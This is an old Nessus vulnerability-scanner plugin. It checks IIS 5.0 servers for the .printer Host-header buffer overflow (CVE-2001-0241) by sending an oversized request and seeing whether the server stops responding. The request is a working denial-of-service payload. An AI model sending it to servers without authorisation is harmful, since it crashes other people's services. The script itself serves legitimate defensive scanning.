#
# This script was written by John Lampe...j_lampe@bellsouth.net
#
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10657);
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2001-a-0005");
 script_bugtraq_id(2674);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-2001-0241");
 name["english"] = "NT IIS 5.0 Malformed HTTP Printer Request Header Buffer Overflow Vulnerability";


 script_name(english:name["english"]);

 desc["english"] = "
There is a buffer overflow in the remote IIS web server.  
It is possible to overflow the remote Web server and execute 
commands as the SYSTEM user.

At attacker may make use of this vulnerability and use it to
gain access to confidential data and/or escalate their privileges
on the Web server.
 
See http://www.eeye.com/html/Research/Advisories/AD20010501.html 
for more details.

Solution: See http://www.microsoft.com/technet/security/bulletin/ms01-023.mspx

Risk factor : High";

 script_description(english:desc["english"]);

 # Summary
 summary["english"] = "Tests for a remote buffer overflow in IIS 5.0";
 script_summary(english:summary["english"]);

 # Category
 script_category(ACT_DESTRUCTIVE_ATTACK);

 # Dependencie(s)
 script_dependencie("find_service.nes", "http_version.nasl", "www_fingerprinting_hmap.nasl");

 # Family
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"],
               francais:family["francais"]);

 # Copyright
 script_copyright(english:"This script is Copyright (C) 2001 John Lampe",
                  francais:"Ce script est Copyright (C) 2001 John lampe");

 script_require_ports("Services/www", 80);
 exit(0);
}

# The attack starts here

include("http_func.inc");


port = get_http_port(default:80);


sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) exit(0);

if(get_port_state(port)) {
    if(http_is_dead(port:port))exit(0);
    
    mystring = string("GET /NULL.printer HTTP/1.1\r\n");
    mystring = string (mystring, "Host: ", crap(420), "\r\n\r\n");
    mystring2 = http_get(item:"/", port:port);
    soc = http_open_socket(port);
    if(!soc) {exit(0);}
    else {
      send(socket:soc, data:mystring);
      r = http_recv(socket:soc);
      http_close_socket(soc);
      
      if(http_is_dead(port:port))
      {
        security_hole(port);
        exit(0);
      }
    }
}
